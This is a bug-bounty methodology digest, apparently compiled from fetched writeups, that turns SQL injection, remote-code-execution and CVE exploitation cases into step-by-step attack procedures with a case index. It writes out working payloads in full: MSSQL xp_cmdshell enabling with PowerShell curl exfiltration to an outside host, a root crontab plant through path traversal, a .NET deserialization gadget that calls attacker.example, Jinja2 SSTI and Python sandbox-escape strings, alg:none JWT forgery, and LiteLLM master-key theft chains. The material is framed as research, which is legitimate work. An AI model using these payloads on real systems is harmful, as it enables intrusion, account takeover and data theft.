# cve-rce-sqli methodology digest

Distilled from 16 fetched writeups (3 partial extractions) out of 19 URLs. All page content treated as untrusted data.

## Hunting procedures

### 1. Error-based SQLi confirmation in search/filter parameters (MySQL)

**When to test:** Any search bar, filter, or form field that likely hits a database (POST bodies with array-style params like `XSearch[search_series]` are prime candidates).

1. Intercept the search request in Burp, send to Repeater.
2. Append a single quote to the parameter value: `test'`. A `500` with a verbose `SQLSTATE[42000] ... 1064` error = smoke.
3. Confirm by doubling the quote: `test''`. If the server returns `200 OK` with normal content, the input reaches the SQL parser.
4. Run boolean and time-based checks: `test' AND 1=1 --` vs `test' AND 1=2 --`, then `test' AND SLEEP(5) --`.
5. Hand off to SQLMap for DBMS fingerprinting and the report PoC:

```
sqlmap -u "https://target/search" --data="XSearch[search_series]=test" \
  -p "XSearch[search_series]" --risk=3 --level=5 --batch
```

**Verify:** SQLMap identifies boolean-based blind + error-based + time-based blind with backend DBMS named; extract one non-destructive value (e.g. `@@version`) as proof.

### 2. Second-order SQLi via User-Agent / X-Forwarded-For headers

**When to test:** Login flows, logging/analytics endpoints, any app that says "we log your IP", or when body parameters are all sanitized but you suspect headers are stored. Two independent writeups hit this.

1. Send baseline request; note normal response (e.g. `200 OK`).
2. Put `'` in the `User-Agent` header. Status change (e.g. 200 → 401/500) indicates the header reaches a query.
3. Boolean differential: UA `' AND '1'='1` → normal response; `' AND '1'='2` → error/different status confirms boolean-based blind.
4. Fingerprint DBMS by iterating version functions: `' AND substring(@@version,1,1)='1` (MySQL/MariaDB vs Oracle/MSSQL syntax).
5. Enumerate tables with a subselect + wordlist (common names + company-name-derived): `' AND (select 1 from WORDLIST limit 0,1)=1--`. Repeat for columns (`user`, `password`, `passwd`...).
6. For X-Forwarded-For: `X-Forwarded-For: 127.0.0.1' union select sleep(10),null,null;-- -` — a 10s delay confirms time-based SQLi; then extract char-by-char with `substring(flag,N,1)` + `sleep()` conditionals.

**Verify:** Differential responses are consistent and repeatable; extract one value end-to-end (table name → column → row).

### 3. Stacked-query MSSQL injection → RCE via xp_cmdshell

**When to test:** MSSQL backend (error strings, `WAITFOR` works), any injectable header/param where stacked queries (`;`) are allowed.

1. Confirm injection point (single quote + comment restores normal page: `'--`).
2. Test stacking with time delay: `';WAITFOR DELAY '00:00:05';--`. ~5s delay confirms stacked queries.
3. Enable xp_cmdshell:
   `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--`
4. Blind RCE check: `'; EXEC xp_cmdshell 'ping X.burpcollaborator.net';--` — watch Collaborator for DNS/ICMP.
5. Non-destructive output exfil via PowerShell + curl:
   `';EXEC xp_cmdshell 'powershell -c "$x = whoami; curl http://X.burpcollaborator.net/get?output=$x"';--`

**Verify:** Collaborator receives callbacks containing actual command output (`whoami`, EC2 metadata). Source: [time-based SQLi to RCE](https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398).

### 4. UNION-based SQLi full extraction playbook (manual)

**When to test:** Numeric ID parameters (`?id=2`), apps showing DB-driven content. From the SQHell walkthrough.

1. Assume the backend query shape: `SELECT ... FROM posts WHERE id=$id;`.
2. Column count with `ORDER BY n-- -` incrementing n until error; last success = exact column count.
3. Use a non-existent ID (e.g. `40`) before UNION so the original row doesn't hide your output:
   `40 union select 1,2,group_concat(schema_name),4 from information_schema.schemata;-- -`
4. Pivot to tables: `... group_concat(table_name) ... from information_schema.tables where table_schema='DB'-- -`, then columns, then dump: `group_concat(id,"~",flag) from flag-- -`.
5. **Second-query injection:** if the app runs a follow-up query using a value from the first result set (e.g. posts of a user), inject a full SELECT as a string inside the UNION: `2222 union select '1 union select 1,flag,3,4 from flag',2,3-- -`. Tune NULL count until the inner query's column count matches.
6. Boolean-blind fallback on register/username-check endpoints: `ali' or (SELECT length(schema_name) ... limit 1,1)='8'-- -`, then `SUBSTRING(...,1,1)='s'` char-by-char.

**Verify:** Extracted value verified with an equality query returning TRUE; use non-existent IDs and negative controls throughout.

### 5. Table dump WITHOUT SQLi — verbose DB error oracle

**When to test:** JSON APIs behind a strict WAF where injection is hopeless. Endpoints that echo ORM/database errors.

1. Apply a JSON-request testing checklist (content-type switching JSON↔XML, type confusion, nulls) to every POST endpoint.
2. Send type-confused values: `{"customer":{"company":"X","email":null}}`.
3. Look for raw driver errors in responses, e.g. `PG::NotNullViolation ... Failing row contains (...)` — this leaked DB type (PostgreSQL), table name, 20+ columns, and a full row including password hash and invite code.
4. Enumerate the fuzzable parameter (company names via OSINT) and replay to dump every row of the table through the error oracle.
5. Post-exploit: crack hashes, accept invitations via `/invitations/:token/accept`.

**Verify:** Error discloses a full failing row; reproduce across multiple enum values. Never inject — the WAF is the reason this works where SQLi fails.

### 6. Algolia API key exploitation

**When to test:** Any site using Algolia search (JS bundles contain `appID` + API key; grep `main.js` or use a DOM/JS keyword-scanner extension).

1. Find `appID` + `api-key` in JS.
2. Check ACL: `curl "https://{appID}-dsn.algolia.net/1/keys/{api-key}?x-algolia-application-id={appID}&x-algolia-api-key={api-key}" | jq`. `addObject`/`editSettings`/`deleteObject` = high; only `search`/`listIndexes`/`settings` = informative.
3. List indexes: `curl -H "X-Algolia-API-Key: {k}" -H "X-Algolia-Application-Id: {id}" "https://{appID}-dsn.algolia.net/1/indexes/" | jq`.
4. Dump index data: `... /1/indexes/{index_name}`; read settings: `.../settings`.
5. PoC write (non-destructive): `PUT /1/indexes/{name}/settings --data '{"highlightPreTag": "hacked"}'` — `editSettings` can inject JS into search results (stored XSS at scale). Never DELETE indexes in a report PoC.

**Verify:** Settings update reflected back; screenshot before/after. $1,000 P2 case.

### 7. Blind arbitrary file write → RCE via cron (no filename control)

**When to test:** Upload endpoints that accept a caller-controlled destination directory but force a random filename/extension (UUID + `.png`), no read-back, no LFI. The mindset shift: stop fighting the filename, attack the directory.

1. Confirm the directory field enters the path unsanitized: send `uploadPath=../temp`, `..%2f..%2ftrav`, `/tmp/x` and check reflection in the returned URL.
2. Prove the write hits the real filesystem: overshoot traversal (`"../"*14` — extra parents are harmless past `/`) and compare destinations: `/etc`, `/tmp`, `/root` succeed; `/proc` fails with "cannot create directory". Kernel semantics = real FS; success under `/root` = root writer.
3. Turn errors into a filesystem oracle: writing to `<existing-file>/x` fails (non-directory blocks path), absent path succeeds → yes/no existence questions. Fingerprint: `/etc/redhat-release`, `/usr/sbin/crond`, `/etc/cron.d/0hourly`, `/.dockerenv`.
4. Plant a self-removing crontab as the file body into `/etc/cron.d`:
   `* * * * * root /usr/bin/id > /tmp/proof 2>&1; /usr/bin/find /etc/cron.d -maxdepth 1 -name "*__*.png" -delete`
   Cron reads directory contents, not extensions — the forced `.png` name is irrelevant.
5. Read command output through the oracle: `touch "/tmp/out-$(id -u)-$(id -un)-$(uname -m)"`, then probe `/tmp/out-0-root-x86_64` plus negative controls (wrong uid/user/arch all absent).
6. Bypass DNS-restricted egress with `curl --resolve host:80:YOUR_IP` in the cron line for the final OOB callback.

**Verify:** Oracle shows proof file exists + crontab self-removed; collaborator receives `uid=0(root)`. CVSS 10.0. Other directory-consumer primitives to consider: `/etc/profile.d`, systemd units, logrotate, sudoers.d (dangerous).

### 8. Limited path traversal → full RCE chain (Java/JSF admin panels)

**When to test:** Subdomains on odd ports (8443) returning 404 — fuzz anyway. Java/JSF stacks (`/faces/`, `.xhtml`).

1. Fuzz the 404 host: `ffuf -u http://admin.target:8443/FUZZ` → found `/admin/` → login at `/admin/faces/jsf/login.xhtml`.
2. Keep fuzzing deeper: `/admin/FUZZ` → `/admin/download` returning 200 with empty body.
3. Discover the right parameter using a known-valid file: fuzz param names with `filename=FUZZ` style wordlist against `/admin/js/main.js` → parameter is `fileName`.
4. Test traversal scope: `/etc/passwd` fails, but files under `/admin/*` work = **limited path traversal**. Read `/WEB-INF/web.xml` for servlet mappings → discover `/incident-report` which downloads real-time log zips.
5. Mine the logs: found MD5 admin passwords; latest one (`Glglgl123`) worked on the JSF login → full admin panel.
6. Admin panel contained `export_step2.xhtml` with a **Groovy console** → arbitrary code execution, but commands ran with no output.
7. Chain back to step 4: run `print "sudo cat /etc/passwd".execute().text`, then re-download `/admin/incident-report` logs — the RCE output is in the fresh logs.

**Verify:** Command output appears in real-time log download. $40,000 total (split into 3 reports). OOB was blocked by egress WAF — in-band exfil via logs paid better anyway.

### 9. .NET deserialization RCE via automation/webhook features (ObjectDataProvider)

**When to test:** No-code/automation platforms (AppSheet-style bots, scheduled workflows), any .NET backend that accepts custom JSON bodies for webhooks.

1. Create an automation bot with a schedule; add a "Call a webhook" step (POST to your server).
2. In the custom JSON body, inject a polymorphic .NET gadget instead of normal data:

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, ...",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":
   ["cmd","/c powershell -command \"Invoke-WebRequest -URI http://attacker.example\""]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System, ..."}}
```

3. Save, wait for the scheduled run, check your server logs for a callback from the vendor infrastructure.

**Verify:** HTTP request from backend = code execution. $10,000 Google VRP. Key signal: JSON with `$type` binding accepted anywhere = test for unsafe deserialization.

### 10. JWT alg=none / missing signature requirement → arbitrary account login (SharePoint CVE-2026-55040)

**When to test:** SharePoint Server Subscription Edition (or any app with custom JWT handlers). Old fixed JWT bugs returning "in a new form" on new codebases.

1. Check whether the token handler sets `RequireSignedTokens = false` — craft a Bearer JWT with header `{"typ":"JWT","alg":"none"}` and empty signature segment.
2. To pass `ValidateIssuer`, nest an `actortoken` whose `x5t` header references the farm's auth cert thumbprint. Get the cert from `<siteurl>/_layouts/15/metadata/json/1`, SHA-1 the base64 cert for x5t.
3. Set `nameidissuer:AccessToken` + arbitrary `upn`/`nameid` to impersonate any user (incl. `NT AUTHORITY\LOCAL SERVICE`, SiteAdmin).
4. To use the token on pages that don't normally accept app tokens, inject `/_api/` into the path info: `POST /_layouts/15/ToolPane.aspx/_api/?DisplayMode=Edit...`.
5. PoC script: `python gettoken.py -u <siteurl>` → enumerate `/my/_api/web/siteusers` → mint admin token with `-n <username>`.

**Verify:** Unauthenticated request returns SiteAdmin-level API data. Researcher PoC: github.com/l0ggg/CVE-2026-55040.

### 11. libarchive path traversal in boot-time provisioning (Apple PCC CVE-2026-20685, $150k)

**When to test:** Research VM environments (Apple VRE), any code that extracts archives as root at boot and picks an extractor by magic bytes.

1. Map the boot window: PID-1/root process downloads + extracts artifacts before steady-state services run; whatever it writes persists.
2. Find extractor dispatch weakness: first 4 bytes choose extractor; tar's `ustar` magic sits at offset 257 → tar falls through to a generic `extract(to:)` that appends entry names to the output dir with **no sanitation** and no libarchive security flags.
3. Count traversal depth: base is `/var/tmp/darwin-init/cryptex/<UUID>/`; `..`×3 → `/var/tmp` (wiped at reboot — useless), ×4 → `/var/db` (**persists**), ×5 → `/`.
4. Build a dual-purpose tar: traversal entries (`../../../../db/...`) + a structurally valid cryptex bundle (`Restore/BuildManifest.plist`, `Restore/Cryptex/...`) so post-install checks (`fullyApplied`) still pass and boot completes.
5. Escalate impact: overwrite a LaunchDaemon `PathState`-triggered config (`/var/db/prcos/splunkloggingd/config-main.plist`) to redirect telemetry/inference metadata to your server as soon as the file exists.

**Verify:** File written as root survives userspace reboot (`.DarwinSetupDone` present); telemetry arrives at attacker listener. Generalizable: audit any privileged archive extraction for missing `ARCHIVE_EXTRACT_SECURE_*` flags and empty validator stubs.

### 12. LiteLLM / AI-gateway RCE chains (4 full chains — pattern catalog)

**When to test:** LiteLLM or similar Python LLM proxies/gateways; you hold a low-privilege `internal_user` key. Techniques transfer to any admin-gateway target.

- **Auth-bypass-on-DB-down + pool exhaustion:** if config allows requests when DB is unavailable, flood DB-touching endpoints with fabricated keys (failures aren't negatively cached → Prisma pool of 10 exhausts), then race `POST /key/generate {"user_id":"default_user_id","max_budget":999999,"duration":"365d"}` in the failure window → PROXY_ADMIN key.
- **Jinja2 SSTI via prompt testing:** `POST /prompts/test` with `dotprompt_content` containing `{{ cycler.__init__.__globals__.os.popen('id').read() }}` — autoescape does NOT stop SSTI.
- **Python sandbox escape via coroutine frames:** in `exec()`-based custom guardrails with emptied `__builtins__` + regex denylist, call an async helper without awaiting: `http_get("http://127.0.0.1").cr_frame.f_builtins["__import__"]("os").popen("id").read()` — `cr_frame`/`f_builtins`/dict-key `__import__` access all dodge token blocklists.
- **Premium-field smuggling via nested metadata:** top-level `allowed_passthrough_routes` is gated, but `{"metadata":{"allowed_passthrough_routes":["/user","/team",...]}}` in `/key/generate` is persisted verbatim — check enforcement on top-level fields only.
- **Prefix-match route gates:** one allowed route `/user` grants `/user/update`, `/user/123`, everything beneath — always test sibling paths.
- **Self-update mass assignment:** `/user/update` allowed self-update and copied all fields → set `user_role":"proxy_admin"`. Compare guards on `/user/new` vs `/user/update` — drift = bug.
- **Unauth onboarding token leak:** `GET /onboarding/get_token?invite_link=<uuid>` had no auth; mint an invite for a proxy_admin by adding `default_user_id` to a team you admin (invitation check only tested shared team, not target role). Respect cache TTLs (60s user cache → sleep 65).
- **Stored env-reference secret theft:** store `langfuse_secret_key: "os.environ/LITELLM_MASTER_KEY"` in key metadata logging config (write path had no env-ref check even though request-body path was patched), then hit the `/langfuse/anything` passthrough — Basic-auth header to your `langfuse_host` (httpbin) echoes `MARKER:REAL_MASTER_KEY`. Then MCP stdio RCE: `POST /v1/mcp/server {"transport":"stdio","command":"python3","args":["-c","<payload>"]}` + trigger via `/mcp-rest/test/connection` or `/v1/mcp/server/health`.

**Verify:** each chain ends in root `id` output from the proxy container. Meta-lesson: patches fix one resolution path, not the class — re-audit every path that touches the same sink after each fix.

### 13. CVE recon-to-exploit workflow (Liferay CVE-2025-4388 example)

**When to test:** Mass subdomain triage on wide-scope programs.

1. Collect subdomains, probe: `cat subdomains.txt | httpx -td -sc -title -ip` (title + tech detect + status + IP).
2. Open survivors in bulk (bulk URL opener extension), fingerprint each with Wappalyzer.
3. When a known CMS/framework appears (e.g. Liferay Portal), recall/look up recent CVEs for it and test the public PoC.
4. Keep a personal CVE-to-fingerprint mapping; reading other writeups feeds this.

### 14. WordPress File Upload plugin arbitrary file read (CVE-2024-9047) — partial

**When to test:** WordPress sites with "WordPress File Upload" plugin ≤ 4.24.11.

- Unauthenticated `wfu_file_downloader.php` mishandles `file` and `handler` params → directory traversal → arbitrary file download (`/etc/passwd`, `wp-config.php`).
- Version fingerprint via plugin readme/asset versions; then request the downloader endpoint with traversal in `file`.

### 15. ONLYOFFICE OnlyShells chain (XSS stage — partial extraction)

Three XSS primitives chained toward SYSTEM (CVE-2025-68917/68935/68936): unescaped comment edit field (`</textarea><script>...`), payload in font name injected into `style` attr in list-parameters modal, and zero-click XSS via unescaped document theme name executed on document open. The full RCE-to-SYSTEM stage wasn't in the extracted content — see coverage notes.

## High-value tips

- **Fuzz 404 subdomains and odd ports** (`:8443`) — a 404 root hides `/admin/` paths; the $40k chain started there.
- **Use a known-valid file to fuzz LFI parameter names** — if the file can't be served, you can't tell param-not-found from wrong-param.
- **Overshoot traversal depth** (`../` ×14) — past root it's harmless, and you never undershoot.
- **Error differences are an oracle**: "cannot create directory" vs success on `/proc` vs `/etc` proved real-FS root writes — read the kernel's answers one bit at a time.
- **When the filename is forced (UUID.png), attack the directory, not the name** — cron, profile.d, systemd, logrotate all consume directories regardless of extension.
- **`curl --resolve host:port:IP`** bypasses DNS-restricted egress for OOB callbacks.
- **In-band > OOB for bounty**: when egress WAF blocks Collaborator, exfil command output through app features (real-time log downloads) — direct RCE pays more than OOB.
- **Test headers, not just body params**: User-Agent and X-Forwarded-For land in DB logging queries when body params are parameterized.
- **Stacked queries on MSSQL → xp_cmdshell** is the fastest SQLi→RCE path; exfil output via `powershell -c "$x=cmd; curl http://collab/?o=$x"` instead of writing tables.
- **Use a non-existent ID before UNION SELECT** so the original row doesn't hide injected output.
- **WAF too strong? Stop injecting.** Type confusion (`"email":null`) on JSON APIs can dump whole tables via raw ORM error rows — no injection needed.
- **Algolia keys**: ACL check first; `editSettings` = stored JS injection in search at scale; never DELETE in a PoC.
- **Patches fix paths, not classes**: LiteLLM fixed env-ref resolution in request bodies but not in the DB-write path — always re-audit sibling code paths after a patch diff.
- **`alg:none` JWTs still live** in handlers with `RequireSignedTokens=false`; a nested actor token + public metadata endpoint cert (x5t) passes issuer checks.
- **tar/zip extraction as root**: magic-byte extractor dispatch + missing libarchive secure flags + empty validator stubs = persistent root file write. Count `..` depth against what survives reboot.
- **Ask the program for permission to pursue RCE** after finding admin access — HX007 got explicit green light and the program asked to split reports, raising total payout.
- **Combine related findings into one narrative first**; let the program request the split (they may pay more per split report).
- **LLM-assisted auditing found individual LiteLLM bugs fast, but chains came from human threat-modeling backward from the allowed attacker position.**

## Case index

| Vuln class | Target/program | Bounty | One-line technique | URL |
|---|---|---|---|---|
| sqli | Mercedes-Benz (Bugcrowd VDP) | — | Quote/double-quote differential in search POST param → SQLMap confirm | https://medium.com/@youssefbughunter/how-i-found-a-critical-sql-injection-in-mercedes-benz-my-first-write-up-cb9c4c1fb7f3 |
| rce, cloud | GitLab (ExifTool metadata) | $20,000 | SKIPPED — HackerOne login wall | https://hackerone.com/reports/1154542 |
| cve-exploit, cloud | Apple Private Cloud Compute (CVE-2026-20685) | $150,000 | libarchive tar traversal in root boot process → persistent /var/db write → telemetry redirect | https://blog.sentry.security/beyond-prompt-injection-hacking-apples-private-cloud-compute/ |
| oauth, cve-exploit | SharePoint SSE (CVE-2026-55040) | Pwn2Own-range (duplicate) | alg:none JWT + actor-token x5t from public metadata → impersonate anyone | https://blog.viettelcybersecurity.com/sharepoint-cve-2026-55040/ |
| rce, graphql | Mozilla Taskcluster | $12,000 | SKIPPED — HackerOne login wall (GraphQL sift $where injection per tweet) | https://hackerone.com/reports/3782701 |
| rce | ingress-nginx controller | $2,500 | SKIPPED — HackerOne login wall (path field injection per tweet) | https://hackerone.com/reports/1620702 |
| rce, lfi | BugCrowd private (JSF admin) | $40,000 | Limited traversal → web.xml → log leaks creds → Groovy console → output via real-time logs | https://medium.com/@HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea |
| rce, lfi | Private program | $0 (vendor out of scope) | Blind upload dir-traversal → /etc/cron.d plant → FS-oracle + curl --resolve exfil | https://alvinferd.medium.com/escalating-a-blind-upload-to-rce-via-path-traversal-into-cron-and-dns-restricted-callback-bypass-0f63db01be92 |
| llm-ai, cve | LiteLLM (Pwn2Own prep) | — | 4 chains: DB-down auth bypass, SSTI, sandbox escape, metadata smuggling, env-ref master-key leak → MCP stdio RCE | https://starlabs.sg/blog/2026/05-race-against-the-patch-the-evolution-of-four-exploit-chains-in-litellm/ |
| cve-exploit | ONLYOFFICE (OnlyShells) | — | 3 XSS primitives (incl. zero-click theme-name XSS) chained toward SYSTEM (partial content) | https://bi.zone/eng/expertise/blog/lomaem-onlyoffice-za-3-shaga-tsepochka-uyazvimostey-onlyshells/ |
| sqli → rce | Private program | — | UA-header stacked MSSQLi → xp_cmdshell → PowerShell curl exfil | https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398 |
| sqli | TryHackMe SQHell (teaching) | — | Full manual playbook: ORDER BY, UNION w/ non-existent ID, second-query injection, XFF time-based | https://infosecwriteups.com/8fd24360c65e |
| cve-exploit (API key) | Private program (Algolia) | $1,000 (P2) | JS-bundle Algolia key → ACL check → index dump → editSettings JS injection | https://hackwithsuryesh.medium.com/algolia-api-key-exploitation-leads-to-1000-bounty-p2-on-private-program-2e147f052ff0 |
| sqli | Private program | — | Boolean-blind SQLi via User-Agent; subselect + wordlist table/column enum | https://medium.com/@frostnull/sql-injection-through-user-agent-44a1150f6888 |
| cve-exploit | Liferay (CVE-2025-4388) | — | httpx+Wappalyzer fingerprint → recall known CVE → test PoC (thin writeup) | https://doordiefordream.medium.com/how-i-found-the-cve-2025-4388-5f10d0b28e71 |
| sqli (alt) | Private program (Cloudflare WAF) | — | JSON null type-confusion → PG::NotNullViolation leaks full table rows | https://medium.com/p/dumping-the-content-of-a-table-without-sql-injection-2601480bcc1e |
| deserialization rce | Google AppSheet | $10,000 | Automation webhook JSON body → .NET ObjectDataProvider gadget → PowerShell callback | https://infosecwriteups.com/955b0a2e840b |
| methodology | Email input fields | — | RFC822 validation matrix + multi-class payload testing (member-only, partial) | https://infosecwriteups.com/the-ultimate-guide-to-email-input-field-vulnerability-testing-18f96fc42251 |
| file-upload, cve | WordPress File Upload ≤4.24.11 (CVE-2024-9047) | — | Unauth wfu_file_downloader.php file/handler traversal → arbitrary file read | https://medium.com/@verylazytech/poc-wordpress-file-upload-plugin-in-the-wfu-file-downloader-php-57a173ab9e90 |

## Coverage notes

- **Skipped (3, all HackerOne login walls):** reports 1154542 (GitLab ExifTool RCE, $20k — CVE-2021-22205 djvu annotation injection per public record), 3782701 (Mozilla Taskcluster GraphQL `sift $where` unauth RCE, $12k), 1620702 (ingress-nginx RCE via `spec.rules.http.paths.path`, $2.5k). Only tweet-level context available; no procedures distilled from these.
- **Partial extractions (3):** bi.zone OnlyShells (only the XSS stage captured; the privilege-escalation-to-SYSTEM stages were not in the fetched text — thin evidence on Windows privesc chaining); email-field testing guide and WordPress CVE-2024-9047 PoC were Medium member-only — only intro/overview portions available, so their procedures are less detailed than the original.
- **Thin evidence:** CVE-2025-4388 writeup is mostly recon narrative with no exploit detail for the Liferay bug itself; GraphQL `$where` RCE and k8s ingress RCE classes have zero fetched detail (only the skipped H1 tweets). Deserialization RCE has one second-hand writeup (not the original researcher). No JWT/oAuth material beyond the SharePoint case; no XXE/SSTI-independent cases beyond LiteLLM.
